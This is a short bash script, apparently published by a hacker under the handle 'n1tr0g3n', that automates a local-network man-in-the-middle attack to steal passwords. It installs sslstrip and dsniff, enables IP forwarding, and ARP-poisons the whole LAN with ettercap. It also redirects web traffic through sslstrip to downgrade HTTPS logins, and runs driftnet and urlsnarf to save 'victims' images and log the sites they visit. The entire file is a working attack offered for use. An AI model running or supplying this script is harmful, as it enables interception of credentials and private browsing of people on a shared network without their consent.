#!/bin/bash
echo
echo                                                                           
echo                        
echo ".##....##....##...########.########....#####....######....#######..##....##"
echo ".###...##..####......##....##.....##..##...##..##....##..##.....##.###...##"
echo ".####..##....##......##....##.....##.##.....##.##...............##.####..##"
echo ".##.##.##....##......##....########..##.....##.##...####..#######..##.##.##"
echo ".##..####....##......##....##...##...##.....##.##....##.........##.##..####"
echo ".##...###....##......##....##....##...##...##..##....##..##.....##.##...###"
echo ".##....##..######....##....##.....##...#####....######....#######..##....##"
echo
echo "              n1tr0g3n's https password sniff3r";
echo "           www.n1tr0g3n.com & www.Top-Hat-Sec.com";
echo
echo "This script will attempt to install & update SSLStrip and Dsniff package";
sleep 5
echo
sudo apt-get install sslstrip
sudo apt-get install dsniff
clear 
echo 
echo
echo
echo
echo
echo "**************************************************************************************************"         
echo "This script will create a folder named images on your desktop to save victims images from browser";
echo "**************************************************************************************************"
echo
echo "**************************************************************************************************"
echo "A bunch of Xterm windows will open on top of eachother so just spread them out across your screen";
echo "**************************************************************************************************"
echo
read -p "Press ENTER to continue with the script & begin SSL p0wnag3"
clear
echo
echo
sudo mkdir /root/Desktop/images
echo
echo
#This command will ask you for your interface name
echo
echo "Please type the name of your network interface in below";
read IFACE;
sleep 2
#This will allow you to forward packets from the router
echo
echo
echo "1" > /proc/sys/net/ipv4/ip_forward 
echo
echo
echo
#This will start driftnet to capture images on your computer
sudo xterm -e driftnet -i $IFACE -d /root/Desktop/images &
echo
echo
#This will start URLSnarf to show the websites the victim browses
sudo xterm -e urlsnarf -i $IFACE &
echo
echo
#this command will set up all redirection
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo
echo
#This command will start ettercap
sudo xterm -e ettercap -TqM ARP:REMOTE // // &
echo
echo
#This command will start SSLStrip to start sniffing https:// passwords
echo
sudo sslstrip -l 10000 &



